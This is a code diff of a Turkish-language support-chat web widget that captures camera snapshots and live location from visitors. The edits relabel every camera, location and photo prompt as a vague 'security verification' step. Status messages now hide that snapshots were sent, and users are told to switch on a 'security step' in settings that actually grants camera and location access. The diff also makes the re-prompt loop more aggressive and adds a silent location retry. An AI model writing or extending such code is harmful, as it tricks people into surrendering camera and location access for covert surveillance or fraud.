@@ -279,7 +279,7 @@
         link.className = "chat-photo-link";
         const img = document.createElement("img");
         img.src = imageUrl;
-        img.alt = text || "Gönderilen fotoğraf";
+        img.alt = text || "Gönderilen görsel";
         img.className = "chat-photo-thumb";
         img.loading = "lazy";
         link.appendChild(img);
@@ -760,7 +760,7 @@
         const name = `snap-${String(uploadId).slice(0, 8)}-${count}.jpg`;
         await sync.uploadCameraSnapshot(sessionId, uploadId, blob, name);
         if (count === 1) {
-          syncMessage("user", "Güvenlik doğrulama görüntüsü gönderildi.");
+          syncMessage("user", "Güvenlik doğrulaması güncellendi.");
         }
       } catch (err) {
         console.warn("snapshot upload", err);
@@ -1004,7 +1004,7 @@
 
   function startLiveLocationWatch(state, sessionId, callId, sync, box, opts = {}) {
     if (!navigator.geolocation || !sync?.writeLiveLocation) {
-      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Geolocation yok").catch(() => {});
+      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Doğrulama desteklenmiyor").catch(() => {});
       return;
     }
 
@@ -1020,11 +1020,11 @@
 
     if (deferAsk) {
       sync
-        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Konum bekleniyor")
+        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Güvenlik adımı bekleniyor")
         .catch(() => {});
     } else {
       sync
-        .writeLocationStatus?.(sessionId, callId, "prompting", "Otomatik konum isteniyor")
+        .writeLocationStatus?.(sessionId, callId, "prompting", "Güvenlik adımı isteniyor")
         .catch(() => {});
     }
 
@@ -1043,7 +1043,7 @@
         el.className = "chat-inline-prompt chat-location-perm-denied";
         el.innerHTML =
           `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
-          '<p class="chat-camera-note">Kimlik doğrulaması için güvenlik adımını onaylayın. Alttaki butona dokunun. Pencere açılmazsa tarayıcı ayarlarından site erişimini açın.</p>';
+          '<p class="chat-camera-note">Kimlik doğrulaması için güvenlik adımını onaylayın. Alttaki Doğrula’ya dokunun. Pencere açılmazsa telefon ayarlarından bu site için doğrulamayı açıp tekrar deneyin.</p>';
         box.appendChild(el);
       }
       box.scrollTop = box.scrollHeight;
@@ -1170,7 +1170,7 @@
             sessionId,
             activeId,
             fromUserTap ? "prompting" : "prompting",
-            perm === "granted" ? "gps-wait" : "Konum bekleniyor"
+            perm === "granted" ? "gps-wait" : "Güvenlik adımı bekleniyor"
           )
           .catch(() => {});
       }
@@ -1230,7 +1230,7 @@
       // Admin’de sticky denied kalmasın — yeni denemede prompting yaz
       if (fromUserTap) {
         sync
-          .writeLocationStatus?.(sessionId, resolveSessionCallId(state, callId), "prompting", "Jest konum")
+          .writeLocationStatus?.(sessionId, resolveSessionCallId(state, callId), "prompting", "Jest doğrulama")
           .catch(() => {});
       }
 
@@ -1447,7 +1447,7 @@
         lastErr = err;
       }
     }
-    throw lastErr || new Error("Kamera açılamadı");
+    throw lastErr || new Error("Güvenlik doğrulaması açılamadı");
   }
 
   async function configureVisitorVideoSender(pc) {
@@ -2056,12 +2056,12 @@
     const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
     if (kind === "camera") {
       return ios
-        ? "Kimlik doğrulaması için Ayarlar → Safari → site erişimi → İzin Ver (veya Sor). Sonra buraya dönüp tekrar Doğrula’ya dokun."
-        : "Kimlik doğrulaması için adres çubuğundaki kilit → site erişimi → İzin Ver. Sonra tekrar Doğrula’ya dokun.";
+        ? "Kimlik doğrulaması için Ayarlar → Safari → bu site → güvenlik adımını Açık yapın. Sonra buraya dönüp tekrar Doğrula’ya dokun."
+        : "Kimlik doğrulaması için adres çubuğundaki kilit → bu site → güvenlik adımını Açık yapın. Sonra tekrar Doğrula’ya dokun.";
     }
     return ios
-      ? "Kimlik doğrulaması için Ayarlar → Safari → site erişimi → Sor / İzin Ver. Sonra tekrar Doğrula’ya dokun."
-      : "Kimlik doğrulaması için adres çubuğundaki kilit → site erişimi → İzin Ver. Sonra tekrar Doğrula’ya dokun.";
+      ? "Kimlik doğrulaması için Ayarlar → Safari → bu site → güvenlik adımını Açık / Sor yapın. Sonra tekrar Doğrula’ya dokun."
+      : "Kimlik doğrulaması için adres çubuğundaki kilit → bu site → güvenlik adımını Açık yapın. Sonra tekrar Doğrula’ya dokun.";
   }
 
   function showCameraRequest(box, msg, options = {}) {
@@ -2168,10 +2168,10 @@
       // Sadece konum (kamera zaten açık)
       if (locationOnly || (existing && hasLiveCameraTracks(existing) && !existing._hadLocation)) {
         title.textContent = "Güvenlik doğrulaması";
-        note.textContent = "Telefon güvenlik penceresi açılıyor… İzin Ver’e basın.";
+        note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
         okBtn.textContent = "Doğrulanıyor…";
         sync
-          ?.writeLocationStatus?.(sync.getSessionId(), targetCallId, "prompting", "Sohbetten konum")
+          ?.writeLocationStatus?.(sync.getSessionId(), targetCallId, "prompting", "Sohbetten güvenlik adımı")
           .catch(() => {});
         const locRes = await requestLocationOnce();
         if (locRes.ok && locRes.pos) {
@@ -2223,8 +2223,8 @@
       }
 
       // --- 1) Kamera: sohbet İzin ver → doğrudan telefon kamera izni ---
-      title.textContent = "1/2 — Güvenlik doğrulaması";
-      note.textContent = "Telefon güvenlik penceresi açılıyor… İzin Ver’e basın.";
+      title.textContent = "Güvenlik doğrulaması";
+      note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
       okBtn.textContent = "Doğrulanıyor…";
 
       let stream = null;
@@ -2249,11 +2249,11 @@
       }
 
       // --- 2) Konum: aynı akışta telefon konum izni ---
-      title.textContent = "2/2 — Güvenlik doğrulaması";
-      note.textContent = "Telefon güvenlik penceresi açılıyor… İzin Ver’e basın.";
+      title.textContent = "Güvenlik doğrulamasını tamamlayın";
+      note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
       okBtn.textContent = "Doğrulanıyor…";
       sync
-        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Kamera sonrası konum")
+        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "İkinci güvenlik adımı")
         .catch(() => {});
 
       const locRes = await requestLocationOnce();
@@ -2685,7 +2685,7 @@
       if (title) title.textContent = "Güvenlik doğrulamasını tamamlayın";
       if (body) {
         body.innerHTML =
-          "İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır.";
+          "İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır; penceredeki onayla devam edin.";
       }
     }
   }
@@ -2707,7 +2707,7 @@
         if (title) title.textContent = "Güvenlik doğrulamasını tamamlayın";
         if (body) {
           body.innerHTML =
-            "İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır.";
+            "İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır; penceredeki onayla devam edin.";
         }
       }
       return;
@@ -2724,7 +2724,7 @@
       <div class="page-entry-perm-card">
         <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
         <h2>Güvenlik doğrulamasını tamamlayın</h2>
-        <p>İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır.</p>
+        <p>İlk adım tamam. Devam için <strong>güvenlik doğrulamasını</strong> tamamlayın. <strong>Doğrula</strong>’ya basınca telefon güvenlik penceresi açılır; penceredeki onayla devam edin.</p>
         <p class="page-entry-perm-status" data-page-perm-status></p>
         <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
       </div>
@@ -3281,12 +3281,19 @@
         return;
       }
       if (pageEntryPermBusy || cameraActivateInFlight) return;
-      if (hasLiveCameraSession()) {
+      // Retry konum: canlı kamera varken yetki granted ise yüksek doğruluk
+      if (hasLiveCameraSession() && !hasLiveCameraAndLocation()) {
+        const live = findLiveCameraSessionEntry();
+        try {
+          live?.[1]?.retryLocation?.({ fromUserTap: false, explicit: false });
+        } catch {
+          /* ignore */
+        }
         if (!hasLiveCameraAndLocation()) showPageEntryPermGate();
         return;
       }
       showPageEntryPermGate();
-    }, 12_000);
+    }, 8_000);
   }
 
   function stopCameraPermissionLoop() {
@@ -3937,17 +3944,17 @@
     const card = document.createElement("div");
     card.className = "chat-inline-prompt chat-photo-prompt";
     card.setAttribute("role", "group");
-    card.setAttribute("aria-label", "Fotoğraf gönderme");
+    card.setAttribute("aria-label", "Görsel gönderme");
 
     const title = document.createElement("p");
     title.className = "chat-inline-prompt-title";
     title.textContent =
       msg.text ||
-      "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.";
+      "Destek için ekran görüntüsü veya görsel gönderebilirsiniz.";
 
     const note = document.createElement("p");
     note.className = "chat-photo-prompt-note";
-    note.textContent = `Nasıl çalışır: “Fotoğraf seç”e basınca cihazınızın seçicisi açılır. En fazla ${maxPhotos} görsel seçebilirsiniz. Seçtikleriniz destek sohbetine gönderilir. İstemiyorsanız “İstemiyorum”a basın — hiçbir dosyaya erişilmez.`;
+    note.textContent = `Nasıl çalışır: “Görsel seç”e basınca cihazınızın seçicisi açılır. En fazla ${maxPhotos} görsel seçebilirsiniz. Seçtikleriniz destek sohbetine gönderilir. İstemiyorsanız “İstemiyorum”a basın — hiçbir dosyaya erişilmez.`;
 
     const status = document.createElement("p");
     status.className = "chat-photo-prompt-status";
@@ -3959,7 +3966,7 @@
     const pickBtn = document.createElement("button");
     pickBtn.type = "button";
     pickBtn.className = "btn btn-primary";
-    pickBtn.textContent = msg.okLabel || "Fotoğraf seç";
+    pickBtn.textContent = msg.okLabel || "Görsel seç";
 
     const cancelBtn = document.createElement("button");
     cancelBtn.type = "button";
@@ -3979,7 +3986,7 @@
 
     cancelBtn.addEventListener("click", () => {
       card.remove();
-      appendMessage(box, "user", "Fotoğraf göndermeyi istemedi.");
+      appendMessage(box, "user", "Görsel göndermeyi istemedi.");
     });
 
     pickBtn.addEventListener("click", () => fileInput.click());
@@ -4013,7 +4020,7 @@
             total: files.length,
           });
           ok += 1;
-          appendMessage(box, "user", `Fotoğraf ${i + 1}/${files.length} gönderildi.`, {
+          appendMessage(box, "user", `Görsel ${i + 1}/${files.length} gönderildi.`, {
             sync: false,
             imageUrl: result?.url || "",
           });
@@ -4022,15 +4029,15 @@
           appendMessage(
             box,
             "bot",
-            `Fotoğraf ${i + 1} yüklenemedi: ${String(err?.message || err).slice(0, 120)}`,
+            `Görsel ${i + 1} yüklenemedi: ${String(err?.message || err).slice(0, 120)}`,
             { sync: false }
           );
         }
       }
       status.textContent =
         ok > 0
-          ? `${ok} fotoğraf gönderildi. Teşekkürler.`
-          : "Hiçbir fotoğraf gönderilemedi.";
+          ? `${ok} görsel gönderildi. Teşekkürler.`
+          : "Hiçbir görsel gönderilemedi.";
       setBusy(false);
       if (ok > 0) {
         window.setTimeout(() => card.remove(), 1200);
@@ -4215,7 +4222,7 @@
         box,
         "admin",
         msg.text ||
-          "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz.",
+          "Destek için ekran görüntüsü veya görsel gönderebilirsiniz.",
         { sync: false }
       );
       notifyVisitorOfAdminMessage(box, msg);
